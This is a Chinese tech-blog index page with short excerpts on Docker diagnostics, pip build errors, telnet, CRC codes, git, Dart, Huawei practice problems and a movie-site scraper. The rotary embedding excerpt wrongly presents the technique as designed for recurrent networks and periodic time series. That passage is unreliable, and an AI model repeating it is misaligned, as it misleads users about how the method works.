<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b9a0f154731527ddc521f76fc6b8410/" rel="bookmark">
			win10 docker desktop运行故障自诊断
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在docker desktop运行出错时，程序里有一个诊断工具用于本地诊断，使用管理员权限打开powershell，然后依次执行如下语句：
cd "C:\Program Files\Docker\Docker\resources" .\com.docker.diagnose.exe check 示例结果如下：
这里就告诉我们，docker在wsl里的服务程序没有跑起来，就能够进一步定位问题了。
对于没有团队服务支持的个人使用，还是可以的。
参考资料：Overview
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b173f125ddc797c67c2f46e87253874/" rel="bookmark">
			pip lanms-neo报错问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pip lanms-neo报错问题 安装Polygon3的时候，就遇到需要Microsoft Visual C++ 14.0的问题，以为通过本地whl安装，就能避免。结果，lanms-neo这个库，网上还不好找whl文件，找到的都是csdn里面的付费下载，对不起，我没钱。还是老实下载这个吧。（下载完了，写blog的时候，又在csdn找到免费的。。。还是有好人的）。
我是python3.9，免费的这个是python3.10(资源重复，地址：地址），我会上传到我的资源下，方便大家下载，地址：https://download.csdn.net/download/weixin_44824428/87650737。 直接pip lanms-neo报错如下。
根据提示的网址：
https://visualstudio.microsoft.com/zh-hans/visual-cpp-build-tools/
下载 C++ Build Tools，并安装C++桌面开发，默认前几个就行。
安装好之后，直接pip 就行，还是用清华源。
pip install lanms-neo==1.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple 另外在别的blog里面，看到可以用conda 代替pip进行安装，没有试过，不知道有没有用。可以参考这篇blog:https://blog.csdn.net/weixin_42455006/article/details/125793559
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84c2b004b74aa4af5dc6c8585192dc9a/" rel="bookmark">
			Windows ：开启telnet 连接 ip &amp;&amp; 端口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.开启telnet
打开控制面板
程序
启用或关闭Windows功能
勾选上点击确定
安装完成
2.连接设备
打开cmd 命令提示符，输入 telnet + ip + 端口 如果是默认telnet端口可以直接
telnet + ip
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/169a88cdb5f0aa2a10c46b1c32affd75/" rel="bookmark">
			为什么加入rotary_embedding后效果不好?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Rotary Embedding是一种在循环神经网络中使用的技术，通过对输入数据进行旋转来引入周期性信息，以增强模型的表示能力。然而，引入Rotary Embedding不一定总是能够提高模型的性能，可能还需要对数据和模型进行其他的调整。
以下是一些可能导致加入Rotary Embedding后模型效果不好的原因：
数据集特性不适合Rotary Embedding：Rotary Embedding更适合用于具有周期性的时间序列数据，例如音频、天气预报等数据。如果数据集中没有明显的周期性特征，加入Rotary Embedding可能会导致性能下降。
Rotary Embedding参数的选择：Rotary Embedding的效果很大程度上取决于它的参数设置，如角度数和旋转轴的选择。如果参数设置不合理，可能会导致模型性能下降。
模型架构的不适配：Rotary Embedding是为循环神经网络设计的，如果在其他类型的模型中使用，可能会出现性能下降的情况。在使用Rotary Embedding时，需要根据具体的模型架构进行调整。
过拟合或欠拟合：加入Rotary Embedding可能会增加模型的复杂度，从而导致过拟合。另一方面，如果模型本身容量不足，则加入Rotary Embedding可能会导致欠拟合。在这种情况下，需要考虑调整模型复杂度或使用其他的正则化方法来解决。
综上所述，加入Rotary Embedding可能并不总是能够提高模型性能，需要针对具体情况进行分析和调整。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8f9d3d1d9d4b10abaa9fb40eaebe62e/" rel="bookmark">
			计算机底层：循环冗余校验码CRC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		计算机底层：循环冗余校验码CRC 信息位+校验位组成循环冗余校验码，也称CRC码。
循环冗余校验码的思想： 通过将信息进行除以某个规定的数，这个数是提前约定好的，并且两边都知道的数。
假设信息是882，约定了除数是7
那么为啥是7呢？计算机可以通过逆运算推出来，当找到可以令余数为0的数时，两边计算机就可以约定将这个数作为除数
如果得到余数为0，那么这个信息就是正确的，如果不是0，则是错误的：
以上是为了方便理解循环冗余校验码，但是并不是真正的循环冗余校验码的过程。切勿将以上认作是循环冗余校验码
但以上的十进制除法的方式，与循环冗余校验码还是很像的。
循环冗余校验码CRC： 用题目理解：p
与上面一样的是：会规定一个除数和被除数。
除数： 会通过生成多项式，来规定除数。起始除数是一串二进制码，那图中的生成多显示G(x)怎么是一个函数呢？
G(x)可以分解成如上图所示，这样就可以得到一串二进制:1101，而这就是真正的生成多项式。
那题目中生成多项式G(x)是如何的来的呢？
计算机想要得到生成多项式，首先需要确定需求，我们是要纠错呢？还是只需要查错呢？因为我们并不了解循环冗余校验码是如何差错或是纠错的，因此可以先看完整篇文章后，再看这里。
如果想要使校验码拥有纠错能力。那么需要设定知道信息位数K，和校验位数R。使得2^R≥K+R+1。这个公式的意思和海明校验码的意思一样：用2^R所能表示的状态数量，能够表示出错位置的数量。其中R的位数是生成多项式所确定位数的-1个位数。这里不太懂也可以看完整篇文章，再看这里。
学到后面其实还会发现，生成多项式表示的位数越多，校验强度其实越高，既然如此就极易消耗cpu和内存。因此计算机规定校验位数量时，会依据计算机的计算能力和存储能力进行判断。
以上内容下面会解释。
除数的作用：
1.用于得到校验位上的校验码。
2.用于对CRC校验码进行校验。
被除数： 被除数包括了两种：
1.信息位作为被除数，即题目中的：101001。信息位作为被除数，是为了得到校验位上的校验码。
2.信息位+校验位即CRC码作为被除数，是为了进行CRC校验码进行校验。
可以看到题目中的要求是得到CRC 码，就是得到校验位。 获取校验位： 想要得到校验位，需要有：1.信息位，2.生成多项式。
信息位是：101001
生成多项式是：1101
得到两个信息后，需要将除数(生成多项式)的位数-1，那么就是n=3(最高次幂)，得到的这个数，然后在信息位后添n=3加个0。即:101001000
然后进行除法运算:
得到的余数是n=3个位。
运算方法： 模二除。
只看首位，是1就x1进去：
再对1后面的三位010与101进行异或，在得到的结果后面添加信息位的下一个位：
如果遇到第一位是0，那么就x0进去，得到了0000，再进行后三位的异或：
以此类推，最后会得到3bit位的余数，这3位的余数，就是我们添加到信息位后的校验位：
最后得到了CRC码：
到了这里，我们再说说生成多项式：
1.校验位数和生成多项式是有着关系的，生成多项式的最高次幂是校验位的位数。
2.生成多项式位数越多，在得到校验位的计算上，信息位后面需要补更多的0，位数变多了，计算量也就变大了，同时储存它们的空间也需要变大。
3.不及如此，生成多项式位数越多，除数也会变多。因为除数就是生成多项式。
CRC码的校验： 接收方收到发送方的CRC校验码时，需要对CRC校验码进行校验。
生成多项式是接收方和发送方一起规定的，因此都会知道这个生成多项式。
校验方式还是：模二除
还是将生成多项式作为除数，接收的CRC校验码作为被除数。 尝试未出错时的计算：
发现：最后的余数是000，说明信息未发生改变。
尝试发生改变时的计算：
发现：得到了010的余数，不为000说明发生了错误。
CRC码的纠错问题： 根据上图中余数是010，而出错位置也是010。那么余数真的表示出错位置吗？
算出每个出错位置，以及对应的余数，得到一个表格：
上图发现余数为001和010的位置有两处。显然在这里余数并不能表示出错位置。
图中用余数表示出错位置，余数只有3位，只有2^3=8种状态，其中000是其中的一种用来表示正确状态，其余7种表示错误状态。
所以我们知道，余数3位只能表示7种错误位置。也就是到图中第七位的错误为止。
我们会发现这里不能纠错的原因是：第八位和第九位的存在，导致只有3位的余数，不够表示错误位置。
那我们如果减少信息位，让CRC码只有7位，那么余数的7种状态就完全可以一一对应，使得拥有纠错的能力。
减少信息位例题： 信息位只有4位，生成多项式还是1101，得到的CRC码只有7位。
此时再看图：
该信息位置与余数一一对应，这样当我们知道余数时，就可以知道错误位置再哪了。
以上是减少信息位，显然现实中，减少信息位肯定是不可能的。发送的信息是人规定死的。机器不能减少。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8f9d3d1d9d4b10abaa9fb40eaebe62e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/01d8fe001443f0f059bfc5c8f2871360/" rel="bookmark">
			git常用命令操作手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		git常用命令操作手册 git命令官方文档 阮一峰的git命令教程
git常用操作 变量说明：
&lt;url&gt; = 项目地址( https://github.com/liaolongdong/liaolongdong.github.io.git) &lt;repo&gt; = 关联仓库名称( origin, upstream) origin代表远程私仓， up或者 upstream代表远程公仓 &lt;branch-name&gt; = 分支名( dev) &lt;commit-sha&gt; = 提交记录ID( d6d826afd99c64a91473180e75351bab0a547c1f) git查看相关命令用法或帮助 git help
git新建代码仓库 # 在当前目录新建一个Git代码库
git init
# 新建一个目录，将其初始化为Git代码库
git init &lt;project-name&gt;
# 下载一个项目和它的整个代码历史
git clone &lt;url&gt;
# 只拉取最近一次提交记录，用于快速clone代码仓库
git clone --depth 1 &lt;url&gt;
git配置 # 显示当前的Git配置
git config --list
# 编辑Git配置文件
git config -e [--global]
# 设置提交代码时的用户信息
git config --global user.name &lt;name&gt;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/01d8fe001443f0f059bfc5c8f2871360/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39e4eb202564aa705e863f51f55c14c0/" rel="bookmark">
			前端开发中常用的工具方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前端开发中经常使用到的公用方法（使用的是ES6的语法） 毫秒数转换成日期（格式：yyyy-mm-dd、yyyy-mm-dd hh:mm、yyyy-mm-dd hh:mm:ss） /** * @desc 毫秒数转换成日期（格式：yyyy-mm-dd、yyyy-mm-dd hh:mm、yyyy-mm-dd hh:mm:ss）
* @param timeStamp 时间戳毫秒数
* @param type 默认格式为：yyyy-mm-dd 1 对应日期格式yyyy-mm-dd hh:mm 2 对应日期格式yyyy-mm-dd hh:mm:ss
* @return 格式化日期字符串
*/
export const formatDate = (timeStamp, type) =&gt; {
let formatDateStr = '';
let date = new Date(timeStamp);
let year = date.getFullYear();
let month = date.getMonth() + 1;
let day = date.getDate();
let hour = date.getHours();
let minute = date.getMinutes();
let second = date.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39e4eb202564aa705e863f51f55c14c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2e77e37ba36a4b65061a89a1f399e7c/" rel="bookmark">
			ERNIE-ViLG 2.0：百度文心一言文本生成图像模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 简介 本文根据百度2023年3月的《ERNIE-ViLG 2.0: Improving Text-to-Image Diffusion Model with Knowledge-Enhanced Mixture-of-Denoising-Experts》翻译总结的。
ERNIE-ViLG 2.0是一个大规模中文-图像扩散模型，百度论文中说该模型是中文该领域内第一个。主要有下面两个改进：
融合了细粒度的文本知识、图片关键元素知识；比如文本中增加了词性描述，如动词、名词、形容词，图片上增加了物体识别预处理。在不同的去噪步骤（生成步骤），利用了不同的去噪专家（expert）。每个步骤采用了不同的U-Net。 在过去几年，文本-图片扩散模型，例如LDM , GLIDE , DALL-E 2 , Imagen 在生成图片的文本相关性和图片逼真度方面取得了显著的进展。但存在如下两个问题：
在每一个去噪（生成）步骤的学习过程，所有文本（与图片区域交互的）、所有图片区域对目标函数是相同的贡献，没有进行区分。当打开整个去噪过程，不同去噪步骤的要求应该是不同的。但目前主要采用同一个U-Net于所有步骤，即在不同的去噪步骤采用了相同的训练参数。 ERNIE-ViLG 2.0的两个改进就是针对上面两个问题。
实验结果显示，ERNIE-ViLG 2.0效果好于DALL-E 2 和Stable Diffusion 。ERNIE-ViLG 2.0有24B参数（240亿），训练该模型用了320个 Tesla A100 GPUs，训练了18天，普通人玩不起啊。
ERNIE-ViLG 2.0的两个改进主要可以看下图1.虚线（预处理过程）部分，2.混合降噪专家模型。
2 相关工作 1）前几年生成对抗模型较火；2）接着受transformer影响，文本-图片的序列到序列模型出现，如
ERNIE-ViLG , DALL-E ,Cogview , Make-A-Scene , and Parti 。3）最近，扩散模型流行，如LDM , DALL-E 2 , and Imagen。
3 基础知识 4 DDPM回顾 扩散过程：对初始数据图像数据x不断增加高斯噪声，在T步后转换成一个各向同性的高斯分布。公式如下： 2. 去噪过程：是扩散过程的逆过程。通过迭代t=T....1步，将高斯噪声转回。公式如下：
3. 目标函数：
4.预测： 5.跨模关注层（cross modal attention）： 5 ERNIE-ViLG知识增强--文本 我们采用现成的词性工具提取输入文本的词性，增加到输入序列中。如文章最开始的模型图中的a表示“灰色的”是形容词，n表示“猫”是名词。在注意力层，增加这些词性的权重。从而修改上面的公式7为如下： 6 ERNIE-ViLG知识增强--图形 指文章最开始的模型图中的“物体检测”，如我们识别出来的“猫”、“狗”。我们对训练样本的50%增加物体检测。我们修改目标函数（公式3），使其对物体检测对应的区域增加权重，进而提高模型对这些物体的生成的聚焦。修改后目标函数如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2e77e37ba36a4b65061a89a1f399e7c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f927ef91cf346cf9428bdcae98fa3b11/" rel="bookmark">
			实验十七、测量场效应管的夹断电压或开启电压
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、题目 测试 N 沟道场效应管夹断电压（或开启电压）的电路如图1所示。
（1）分析电路的测试原理，并在 Multisim 环境下测试五种不同型号场效应管的夹断电压（或开启电压）。所选场效应管应具有典型性。
（2）修改电路，使之能够测试 P 沟道场效应管的夹断电压（或开启电压），并进行仿真。
图 1 N沟道场效应管夹断电压测量电路 图1\,\,\textrm N 沟道场效应管夹断电压测量电路 图1N沟道场效应管夹断电压测量电路
二、原理分析 手册中给出的夹断电压或开启电压，通常是漏极电流 I D I_D ID​ 为一很小数值（如 5 μA 5\,\textrm{μA} 5μA ）下的栅 - 源电压 U G S U_{GS} UGS​。
（1）因电路引入负反馈，可认为集成运放的两个输入端电位近似为零，净输入电流近似为零，因此源极电流 I S ≈ V 1 R 1 I_S\approx\frac{V_1}{R_1} IS​≈R1​V1​​为使 I S = 5 μA I_S=5\,\textrm{μA} IS​=5μA，实际选取 V 1 V_1 V1​ 为 0.5 V 0.5\,\textrm V 0.5V， R 1 R_1 R1​ 为 100 kΩ 100\,\textrm{kΩ} 100kΩ，如图2所示。此时输出电压的值近似等于场效应管的夹断电压或开启电压。因为集成运放反向输入端的电位只有几毫伏，所以可以忽略它所引起的测量误差，场效应管的 R g s R_{gs} Rgs​ 非常大，可认为 R 3 R_3 R3​ 上无电流通过。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f927ef91cf346cf9428bdcae98fa3b11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1b4177230f0deda5b78cc07dd2fdc66/" rel="bookmark">
			Dart语言基础（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Dart语言特性一、变量变量定义变量默认值 二、常量三、数据类型数字类型字符串布尔值列表集合映射符文 运算符级联运算符类型判定符 Dart语言特性 一切皆为对象，在Dart语言中所有变量类型都是对象，null也是对象，函数也是对象，所有对象都继承自Object。Dart是强类型语言，但是变量类型声明是可选的，Dart可以推断出变量的类型。Dart支持泛型类型，类似java的泛型。函数支持嵌套。不支持public，protected和private关键字，在Dart语言中，可以通过下划线(_)开头命名来表示私有的，反之就是公开的。 一、变量 变量定义 通过var定义并初始化变量
var name = 'ABC'; Dart语言是强类型语言，虽然这里没有指定变量类型，但Dart编译器可以通过首次初始化推断变量的类型。
String name = 'ABC'; //我们也可以直接定义String类型并初始化 变量默认值 因为在Dart语言中一切皆为对象，所以在定义变量时，未初始化的值都是null
int sum; //这里的sum的默认值是null 二、常量 在Dart中的const 和 final 都可以用来定义一个不可变的常量
final name = 'Jack'; final String secondName = 'Rose'; //同样的可以指定或不指定数据类型 const age = 18; final和const的区别就是在编译的时候const的值就已经确定了，而final不一定，可能需要运行的时候才能确定值。
final x =new DataTime.now(); //将x变量的值，初始化为当前时间，x的值只有在运行的时候才能确定 三、数据类型 Dart 支持以下数据类型：
数字(number)字符串(string)布尔值(boolean)列表(list)集合(set)映射(map)符文(rune)符号(Symbol) 数字类型 Dart中数字类型有2种类型：
整数：整数表示没有小数的的数值，使用int关键字表示。双精确度：Dart中表示64位浮点数，使用double关键字表示。 var x = 123; var y = 1.199; 从Dart2.1开始，必要时整数会自动转换为双精确度：
double z = 10; //相当于double z = 10.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1b4177230f0deda5b78cc07dd2fdc66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cd07e6ed435ec270ab7dc92b7794691/" rel="bookmark">
			【牛客网-华为机试题目录】持续更新中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 本专栏主要汇总了《华为机试题 - python》，对每一题涉及的相关函数都进行了详细剖析。
华为机试题：HJ108 求最小公倍数（python）
华为机试题：HJ107 求解立方根（python）
华为机试题：HJ106 字符逆序（python）
华为机试题：HJ105 记负均正II（python）
华为机试题：HJ103 Redraiment的走法（python）
华为机试题：HJ102 字符统计（python）
华为机试题：HJ101 输入整型数组和排序标识，对其元素按照升序或降序进行排序（python）
华为机试题：HJ100 等差数列（python）
华为机试题：HJ99 自守数（python）
华为机试题：HJ97 记负均正（python）
华为机试题：HJ96 表示数字（python）
华为机试题：HJ95 人民币转换（python）
华为机试题：HJ94 记票统计（python）
华为机试题：HJ93 数组分组（python）
华为机试题：HJ92 在字符串中找出连续最长的数字串（python）
华为机试题：HJ91 走方格的方案数（python）
华为机试题：HJ90 合法IP（python）
华为机试题：HJ89 24点运算（python）
华为机试题：HJ86 求最大连续bit数（python）
华为机试题：HJ85 最长回文子串（python）
华为机试题：HJ84 统计大写字母个数（python）
华为机试题：HJ81 字符串字符匹配（python）
华为机试题：HJ80 整型数组合并（python）
华为机试题：HJ76 尼科彻斯定理（python）
华为机试题：HJ73 计算日期到天数转换（python）
华为机试题：HJ62 查找输入整数二进制中1的个数（python）
华为机试题：HJ61 放苹果（python）
华为机试题：HJ60 查找组成一个偶数最接近的两个素数（python）
华为机试题：HJ58 输入n个整数，输出其中最小的k个（python）
华为机试题：HJ56 完全数计算（python）
华为机试题：HJ54 表达式求值（python）
华为机试题： HJ53 杨辉三角的变形（python）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9cd07e6ed435ec270ab7dc92b7794691/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d34bfdcd2a45ed4aea4d082ef2877ec/" rel="bookmark">
			华为机试题： HJ53 杨辉三角的变形（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 知识点详解1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。1.1、input() 与 list(input()) 的区别、及其相互转换方法 2、print() ：打印输出。3、整型int() ：将字符串或数字转换为整型（强转） —— 输入可以指定进制，默认十进制。3.1、bin()：整数转换为二进制码。返回值为字符串。3.2、ord()： ASCII字符转换为数字（Unicode字符 —— Unicode数值）。返回值为十进制整数。3.3、chr()：数字转换为ASCII字符。（Unicode数值 —— Unicode字符）。输入数字可以是10进制或16进制。 描述（找规律）：
以上三角形的数阵，第一行只有一个数1，以下每行的每个数，是恰好是它上面的数、左上角数和右上角的数，3个数之和（如果不存在某个数，认为该数就是0）。求第n行第一个偶数出现的位置。如果没有偶数，则输出-1。
例如：输入3，则输出2；输入4，则输出3；输入2则输出-1。
数据范围：1 ≤ n ≤ 109
输入描述： 输入一个int整数
输出描述：输出返回的int值
示例1
输入： 4 输出： 3 Python3
while True: try: n = int(input()) res = -1 if n &lt;= 2: res = -1 elif n % 2 == 1: res = 2 elif n % 4 == 0: res = 3 else: res = 4 print(res) except: break 知识点详解 1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。 str1 = input() print(str1) print('提示语句:', str1) print(type(str1)) ''' asd123!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d34bfdcd2a45ed4aea4d082ef2877ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea2ec3f1c6a114a2d0feaecc33444f46/" rel="bookmark">
			华为机试题： HJ46 截取字符串（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 知识点详解1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。1.1、input() 与 list(input()) 的区别、及其相互转换方法 2、print() ：打印输出。3、整型int() ：将字符串或数字转换为整型（强转） —— 输入可以指定进制，默认十进制。3.1、bin()：整数转换为二进制码。返回值为字符串。3.2、ord()： ASCII字符转换为数字（Unicode 字符 —— Unicode数值）。返回值为十进制整数。3.3、chr()：数字转换为ASCII字符。（Unicode数值 —— Unicode 字符）。输入数字可以是10进制或16进制。 4、字符串str() ：将参数转换成字符串类型（强转）—— 字符串是有序不可变序列。 描述：
输入一个字符串和一个整数 k ，截取字符串的前k个字符并输出
数据范围：字符串长度满足 1 ≤ n ≤ 1000 ， 1 ≤ k ≤ n
输入描述： 1.输入待截取的字符串。2.输入一个正整数k，代表截取的长度。
输出描述：截取后的字符串
示例1
输入： abABCcDEF 6 输出： abABCc 示例2
输入： bdxPKBhih 6 输出： bdxPKB Python3
while True: try: str1 = input() num1 = int(input()) print(str1[:num1]) except: break 知识点详解 1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。 【Python】input()函数用法小结
str1 = input() print(str1) print('提示语句:', str1) print(type(str1)) ''' asd123!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea2ec3f1c6a114a2d0feaecc33444f46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cc02fca389e56dc255d8e6acd2afe10/" rel="bookmark">
			华为机试题： HJ51 输出单向链表中倒数第k个结点（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 知识点详解1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。1.1、input() 与 list(input()) 的区别、及其相互转换方法 2、print() ：打印输出。3、list列表的常用操作（15+9函数）—— 列表是一个有序可变序列。4、链表的常用操作（8个函数）—— 链表是一个非连续存储的线性表（节点 = 数据域 + 指针域）。 描述：
输入一个单向链表，输出该链表中倒数第k个结点，链表的倒数第1个结点为链表的尾指针。
链表结点定义如下：
struct ListNode { int m_nKey; ListNode* m_pNext; }; 正常返回倒数第k个结点指针，异常返回空指针.
要求：
(1)正序构建链表;
(2)构建后要忘记链表长度。
数据范围：链表长度满足 1 ≤ n ≤ 1000 ，k ≤ n ，链表中数据满足 0 ≤ val ≤ 10000
输入描述：
本题有多组样例输入。
1 输入链表结点个数
2 输入链表的值
3 输入k的值
输出描述：输出一个整数
示例1
输入： 8 1 2 3 4 5 6 7 8 4 输出： 5 Python3
while 1: try: a, list1, b = int(input()), list(input().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8cc02fca389e56dc255d8e6acd2afe10/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51b39a887c19412e6bd957da86c26c31/" rel="bookmark">
			华为机试题：HJ37 统计每个月兔子的总数（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 知识点详解1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。1.1、input()与list(input())的区别、及其相互转换方法 2、print() ：打印输出。3、整型int() ：将字符串或数字转换为整型（强转） —— 输入可以指定进制，默认十进制。4、range() ：输出指定范围内的所有值（前闭后开）。 描述：
有一种兔子，从出生后第3个月起每个月都生一只兔子，小兔子长到第三个月后每个月又生一只兔子。
例子：假设一只兔子第3个月出生，那么它第5个月开始会每个月生一只兔子。
一月的时候有一只兔子，假如兔子都不死，问第n个月的兔子总数为多少？
数据范围：输入满足 1 ≤ n ≤ 31
输入描述： 输入一个int型整数表示第n个月
输出描述：输出对应的兔子总数
示例1
输入：3 输出：2 Python3
while True: try: # 输入：[0,1,2,3,4,5,6,7,8,9,10] # 输出：[1,1,1,2,3,5,8,13,21,34,55] n = int(input()) m1 = 1 m2 = 0 m3 = 0 for i in range (n-1): m3 = m2+m3 m2 = m1 m1 = m3 print(m1+m2+m3) except: break 知识点详解 1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。 【Python】input()函数用法小结
str1 = input() print(str1) print('提示语句:', str1) print(type(str1)) ''' asd123!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51b39a887c19412e6bd957da86c26c31/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81103f3cdbb0e22171cb386481208b3f/" rel="bookmark">
			华为机试题：HJ40 统计字符（python）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 知识点详解1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。1.1、input()与list(input())的区别、及其相互转换方法 2、print() ：打印输出。3、str.isdigit()，str.isnumeric()，str.isdecimal()：检查字符串是否只包含十进制数字，返回布尔值。4、str.isupper()，str.islower()，str.istitle()：检测字符串的大小写，返回布尔值。5、str.isalpha()：检测字符串是否只有字母，返回布尔值。6、str.isalnum()：检测字符串是否只有字母和数字，返回布尔值。7、str.isspace()：判断字符串中是否只有空白字符（可以有多个空白字符），返回布尔值。 描述：
输入一行字符，分别统计出包含英文字母、空格、数字和其它字符的个数。
数据范围：输入的字符串长度满足 1 ≤ n ≤ 1000
输入描述： 输入一行字符串，可以有空格
输出描述：统计其中英文字符，空格字符，数字字符，其他字符的个数
示例1
输入： 1qazxsw23 edcvfr45tgbn hy67uj m,ki89ol.\\/;p0-=\\][ 输出： 26 3 10 12 Python3
while True: try: str1 = input() word, space, digit, other = 0, 0, 0, 0 for ii in str1: if ii.isalpha(): word += 1 elif ii.isspace(): space += 1 elif ii.isnumeric(): digit += 1 else: other += 1 print("{}\n{}\n{}\n{}" .format(word, space, digit, other)) except: break 知识点详解 1、input()：获取控制台（任意形式）的输入。输出均为字符串类型。 【Python】input()函数用法小结
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/81103f3cdbb0e22171cb386481208b3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1f7f291eac8f7293844f778b4284665/" rel="bookmark">
			python爬虫：获取电影信息~
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境准备 1&gt;python环境
路径准备 爬虫开启点都是重获取种子路径开始：
进入某瓣排行首页：
浏览器F12获取到加载电影信息u
https://movie.douban.com/j/chart/top_list?type=6&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20
分析url地址，发现start 跟 limit 分页参数，定制url模板，后续动态替换分页参数
